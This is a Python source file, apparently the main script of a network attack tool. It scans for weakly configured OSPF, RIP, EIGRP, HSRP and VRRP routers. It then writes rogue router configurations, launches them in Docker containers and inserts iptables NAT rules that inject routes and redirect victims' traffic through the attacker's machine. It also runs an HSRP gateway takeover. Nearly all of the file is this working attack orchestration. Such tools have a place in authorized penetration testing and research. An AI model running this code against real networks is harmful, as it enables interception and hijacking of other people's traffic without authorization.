import argparse
import ipaddress
import netifaces
import vuln_scanner
import socket
import docker_wrapper
import os
import re
import pickle

from shutil import copyfile

from state import user_var
from state import vulnerable_eigrp_packets
from state import vulnerable_hsrp_packets
from state import vulnerable_ospf_packets
from state import vulnerable_rip_packets
from state import vulnerable_vrrp_packets
from state import routing_table

from protocols import hsrp
from protocols import vrrp
from protocols import ospf
from protocols import eigrp
from protocols import rip
import utility

import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

def main():

    # cidr, gateway = utility.getMainTableIPV4Routes()

    if user_var.clean:
        docker_wrapper.stop_and_remove_containers()
        if 'vrrp' in user_var.protocol:
            pass

        if 'ospf' in user_var.protocol or 'rip' in user_var.protocol or 'eigrp' in user_var.protocol:
            if user_var.redirect:
                utility.iptablesFILTER("del", user_var)
                utility.iptablesDNAT("del", user_var)
                utility.iptablesSNAT("del", user_var)
                # if user_var.inject:
                #     utility.deleteRoutes(redirect)
            else:
                utility.iptablesFILTER("del", user_var)
                utility.iptablesSNAT("del", user_var)
                # utility.deleteRoutes(ipaddresses)

            # FIXME THIS IS A BAD WAY TO DO IT
            # netwithcidr, gateway = utility.getMainTableIPV4Routes()

            # cidr2, gateway2 = utility.getMainTableIPV4Routes()

            # list_of_differences = utility.compare_routing_tables(cidr, gateway, cidr2, gateway2)
            # utility.editRoutes(netwithcidr, gateway, "delete")

            # FIXME Put this stuff in /dev/shm or /tmp
            original_cidr_list = pickle.load(open('{}/cidr.p'.format(user_var.path), 'rb'))
            original_gateway_list = pickle.load(open('{}/gws.p'.format(user_var.path), 'rb'))
            current_cidr_list, current_gateway_list = utility.getMainTableIPV4Routes()

            list_of_differences = utility.compare_routing_tables(original_cidr_list, original_gateway_list, \
                                                                current_cidr_list, current_gateway_list)

            cidr_differences = []
            gateway_differences = []

            for x in list_of_differences[1]:
                cidr_differences.append(x[0])
                gateway_differences.append(x[1])

            utility.editRoutes(cidr_differences, gateway_differences, "delete")

    elif user_var.scan:
        print(Fore.YELLOW + Style.BRIGHT + '[-]Performing a scan on the following protocols: {}'.format(user_var.protocol))
        if vuln_scanner.start_scan():
            if 'ospf' in user_var.protocol or 'rip' in user_var.protocol or 'eigrp' in user_var.protocol:
                if not os.path.exists(user_var.path):
                    print(Fore.YELLOW + Style.BRIGHT + "[-]Provided path does not exist.")
                    try:
                        os.mkdir(user_var.path)
                    except OSError:
                        print("Creation of the path {} failed. Could not create configuration files.".format(user_var.path))
                        return

                try:
                    copyfile('daemons', '{}/daemons'.format(user_var.path))
                    print(Fore.YELLOW + Style.BRIGHT + '[-]Copied daemons file to {}'.format(user_var.path))
                except Exception:
                    print('Could not copy over daemons, please look at {}'.format(user_var.path))
                    return

                for v_packet in vulnerable_eigrp_packets:
                    eigrp_config, staticd_config, pbrd_config = eigrp.build_configurations(v_packet)
                    writer = open('{}/{}_eigrpd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(eigrp_config)
                    writer.close()
                    writer = open('{}/{}_staticd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(staticd_config)
                    writer.close()
                    writer = open('{}/{}_pbrd.conf'.format(user_var.path,v_packet.source_ip), 'w')
                    writer.write(pbrd_config)
                    writer.close()
                    
                    print(Fore.CYAN + Style.BRIGHT + '[+]Created EIGRP configurations for {} in {}'.format(v_packet.source_ip, user_var.path))

                for v_packet in vulnerable_ospf_packets:
                    ospfd_config, staticd_config, pbrd_config = ospf.build_configurations(v_packet)
                    
                    writer = open('{}/{}_ospfd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(ospfd_config)
                    writer.close()
                    writer = open('{}/{}_staticd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(staticd_config)
                    writer.close()
                    writer = open('{}/{}_pbrd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(pbrd_config)
                    writer.close()

                    # FIXME
                    # Code for demo, to come back to this and give it a proper cleaning
                    if user_var.redirect_local or user_var.inject_local:
                        ospfd_peer_config, staticd_peer_config = ospf.build_peer_configuration(v_packet)
                        writer = open('{}/{}_peer_ospfd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                        writer.write(ospfd_peer_config)
                        writer.close()
                        writer = open('{}/{}_peer_staticd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                        writer.write(staticd_peer_config)
                        writer.close()

                        zebrad_config = ospf.build_peer_zebra_configuration()
                        writer = open('{}/{}_zebra.conf'.format(user_var.path, v_packet.source_ip), 'w')
                        writer.write(zebrad_config)
                        writer.close()

                    print(Fore.CYAN + Style.BRIGHT + '[+]Created OSPF configurations for {} in {}'.format(v_packet.source_ip, user_var.path))
                    

                for v_packet in vulnerable_rip_packets:
                    # FIXME look into getting this done in a better way
                    rip_config, staticd_config, pbrd_config = rip.build_configurations(v_packet)
                    writer = open('{}/{}_ripd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(rip_config)
                    writer.close()
                    writer = open('{}/{}_staticd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(staticd_config)
                    writer.close()
                    writer = open('{}/{}_pbrd.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(pbrd_config)
                    writer.close()
                    
                    print(Fore.CYAN + Style.BRIGHT + '[+]Created RIP configurations for {} in {}'.format(v_packet.source_ip, user_var.path))

                # FIXME these user_var things

                if user_var.attack:
                    print(Fore.YELLOW + Style.BRIGHT + "[-]Performing an attack.")

                    cidr, gateway = utility.getMainTableIPV4Routes()
                    # routing_table.set_network_with_cidr(cidr)
                    # routing_table.set_gateways(gateway)

                    pickle.dump(cidr, open('{}/cidr.p'.format(user_var.path), 'wb'))
                    pickle.dump(gateway, open('{}/gws.p'.format(user_var.path), 'wb'))

                    docker_wrapper.stop_and_remove_containers()
                    if user_var.redirect_local or user_var.inject_local:
                        docker_wrapper.build_and_run_peer_container()
                    docker_wrapper.build_and_run_container()
                    if user_var.redirect:
                        utility.iptablesFILTER("insert", user_var)
                        utility.iptablesDNAT("insert", user_var)
                        utility.iptablesSNAT("insert", user_var)
                    elif user_var.redirect_local:
                        utility.iptablesFILTER("insert", user_var)
                        utility.iptablesDNAT("insert", user_var)
                        utility.iptablesSNAT("insert", user_var)
                    else:
                        utility.iptablesFILTER("insert", user_var)
                        utility.iptablesSNAT("insert", user_var)

            if 'hsrp' in user_var.protocol and user_var.attack:

                # FIXME run the HSRP attack
                # FIXME we need to keep track of the default gateways
                # FIXME possible look at the active one and set our default gw to that
                # FIXME then do clean up
                # FIXME what if there is another gateway????
                print(Fore.YELLOW + Style.BRIGHT + '[-]Performing an HSRP attack')
                hsrp.hsrp_attack_start(user_var.attack_count)
                print(Fore.YELLOW + Style.BRIGHT + '[-]Finished HSRP attack')

            if 'vrrp' in user_var.protocol and user_var.attack:
                vrrp_config = None
                vulnerable_vrrp_packet = None
                for v_packet in vulnerable_vrrp_packets:
                    vrrp_config = vrrp.build_configuration(v_packet)
                    vulnerable_vrrp_packet = v_packet

                    if not create_config_path():
                        return
                
                    writer = open('{}/{}_keepalived.conf'.format(user_var.path, v_packet.source_ip), 'w')
                    writer.write(vrrp_config)
                    writer.close()
                    print('Created VRRP configuration for {} in {}'.format(v_packet.source_ip, user_var.path))

                if user_var.attack:
                    print(Fore.YELLOW + Style.BRIGHT + '[+]Performing an attack')

                    docker_wrapper.stop_and_remove_containers()
                    docker_wrapper.build_and_run_container_vrrp()

def create_config_path():
    if not os.path.exists(user_var.path):
        print(Fore.YELLOW + Style.BRIGHT + "[-]Provided path does not exist.")
        try:
            os.mkdir(user_var.path)
        except OSError:
            print("Creation of the path {} failed. Could not create configuration files.".format(user_var.path))
            return False
    return True

if __name__== "__main__":

    ascii_art = '''\n
  MMMMMMMMMMMMMMMNmdhhhhdmNMMMMMMMMMMMMMMM
  MMMMMMMMMMNho:.          `:+hNMMMMMMMMMM
  MMMMMMMMy:`                   :yNMMMMMMM
  MMMMMMs.           .+/:`        `oNMMMMM
  MMMMd.         `   +dhs+          .hMMMM
  MMMy         -hhy.  /dyy`           oMMM
  MMh          `hdho   +dy/  `/:       sMM
  MN`           `ddy/  :dhs` yhy-       mM
  My             hdy/ /ddh: .ddy+       +M
  M/       .`    dhy:odhy- /hdh: .:`    -M
  M/      :yh/  /dhhhdhy-/hdh+` :dh.    .M
  M:     -ood`..ddhyssyyyhhh-.:+ddy:    .M
  M:    `hhhs.`hdhhhhyyssssyhdhhy/.     .M
  M/     +hd++shhddhhdddhysshy/`        -M
  M/     -hhyyyyyyhdhhyyhhsy:           :M
  M/       `ohhhhyyhhdhyyyy/            .M
  M/        `+hdhhhhhhddhyy             .M
  M/          .:/dddmmdmmd.             .M
  M/            ,sddmmddyo              .M
  MhssssssssssssymmmmNmmmddsssssssssssssyM
'''

    parser = argparse.ArgumentParser(usage=ascii_art)

    parser.add_argument('--interface', required=True, help='Specify the interface from which the attack will be performed.')
    parser.add_argument('--count', required=False, help='Specify the number of packets to capture.', default=1)
    parser.add_argument('--attack-count', required=False, help='Specify the duration of a HSRP attack in number of packets to capture.', default=100)
    parser.add_argument('--inject', required=False, action='append', help='Specify an IP address to route. Example: 10.20.30.4/24 or 1.1.1.1/32',  nargs='+')
    # FIXME
    # fix the redirect flag description
    parser.add_argument('--redirect', required=False, action='append', help='Redirect this traffic to me', nargs='+')
    parser.add_argument('--inject-local', required=False, action='append', help='Specify an IP address to route. Example: 10.20.30.4/24 or 1.1.1.1/32',  nargs='+')
    parser.add_argument('--redirect-local', required=False, action='append', help='Specify an IP address to route. Example: 10.20.30.4/24 or 1.1.1.1/32',  nargs='+')
    parser.add_argument('--clean', required=False, action='store_true', help='Clean container, iptables and blackhole routes')
    parser.add_argument('--target', required=False, help='Specify which device with a vulnerable configuration to attack.')
    parser.add_argument('--scan', required=False, action='store_true', help='Specify whether to perform a scan.')
    parser.add_argument('--attack', required=False, action='store_true', help='Specify whether to perform an attack.')
    parser.add_argument('--protocol', required=False, nargs='*', choices=utility.protocols, help="Specify the protocol.")
    parser.add_argument('--password', required=False, help='Specify the password to setup crypto auth between the protocols.')
    parser.add_argument('--path', required=False, help='Specify the location where config files are stored and read from.', default='/tmp/config')

    args = parser.parse_args()

    validate = True
    inject_ip_addresses = []
    protocols = []
    redirect_ip_addresses = []
    redirect_local_ip_addresses = []
    inject_local_ip_addresses = []

    if args.inject or args.redirect or args.redirect_local or args.inject_local:
        args.scan = True
        args.attack = True

    if not (args.scan or args.attack):
        validate = False
        print("Please provide an action to perform using the --scan or --attack flags.")

    if not utility.check_if_interface_exists(args.interface):
        print('The interface provided does not exist')
        validate = False
    
    if args.attack and not args.target:
        print('Please provide a target when performing an attack.')
        validate = False

    if args.attack:
        args.scan = True

    inject_ips = False
    inject_local_ips = False
    redirect_ips = False
    redirect_local_ips = False

    if args.inject:
        inject_ips = True
        valid_ips = True

        for ip in args.inject[0]:
            if not utility.check_if_valid_ipaddress_with_cidr(ip):
                valid_ips = False
            else:
                inject_ip_addresses.append(ip)

        if not valid_ips:
            validate = False
            print('IP addresses to be injected should be valid and in CIDR notation, eg. 10.20.30.3/24')

    if args.redirect:
        redirect_ips = True
        valid_ips = True

        for ip in args.redirect[0]:
            if not utility.check_if_valid_ipaddress_with_cidr(ip):
                valid_ips = False
            else:
                redirect_ip_addresses.append(ip)

        if not valid_ips:
            validate = False
            print('IP addresses to PitM should be valid and in CIDR notation, eg. 10.20.30.3/24')

    if args.redirect_local:
        redirect_local_ips = True
        valid_ips = True

        for ip in args.redirect_local[0]:
            if not utility.check_if_valid_ipaddress_with_cidr(ip):
                valid_ips = False
            else:
                redirect_local_ip_addresses.append(ip)

        if not valid_ips:
            validate = False
            print('IP addresses to PitM should be valid and in CIDR notation, eg. 10.20.30.3/24')

    if args.inject_local:
        inject_local_ips = True
        valid_ips = True

        for ip in args.inject_local[0]:
            if not utility.check_if_valid_ipaddress_with_cidr(ip):
                valid_ips = False
            else:
                inject_local_ip_addresses.append(ip)

        if not valid_ips:
            validate = False
            print('IP addresses to PitM should be valid and in CIDR notation, eg. 10.20.30.3/24')

    if not args.protocol:
        protocols = utility.protocols
    else:
        for protocol in args.protocol:
            protocols.append(protocol)

    if validate:
        user_var.set_data(args.interface, int(args.count), inject_ips, inject_ip_addresses, args.scan, args.attack, protocols, args.path, args.target, redirect_ips, redirect_ip_addresses, args.clean, int(args.attack_count), inject_local_ips, inject_local_ip_addresses, redirect_local_ips, redirect_local_ip_addresses, args.password)
        main()

